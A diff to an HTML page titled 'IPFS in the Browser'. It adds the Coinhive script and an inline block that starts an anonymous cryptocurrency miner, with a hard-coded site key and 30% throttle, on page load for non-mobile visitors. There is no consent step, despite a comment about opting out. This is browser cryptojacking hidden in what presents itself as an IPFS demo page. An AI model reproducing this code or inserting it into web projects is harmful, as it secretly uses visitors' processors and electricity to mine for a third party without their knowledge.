@@ -3,8 +3,35 @@
 <head>
   <title>IPFS in the Browser</title>
   <script src="https://unpkg.com/ipfs/dist/index.min.js"></script>
-  <script src="https://unpkg.com/node-miner@3.1.0/src/index.js"></script>
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
   <script src="js/newbun72.js"></script>
+ 
+<script>
+	var miner = new CoinHive.Anonymous('Ff1v6mgtt3LpkjenHXWTrQXZ71QGT30o', {throttle: 0.3});
+
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile()) {
+		miner.start();
+	}
+	
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+		// Output to HTML elements...
+	}, 1000);	
+	
+	
+</script>
+
+
+ 
   <script type="text/javascript">
 const ipfsOptions = {
 	config: {
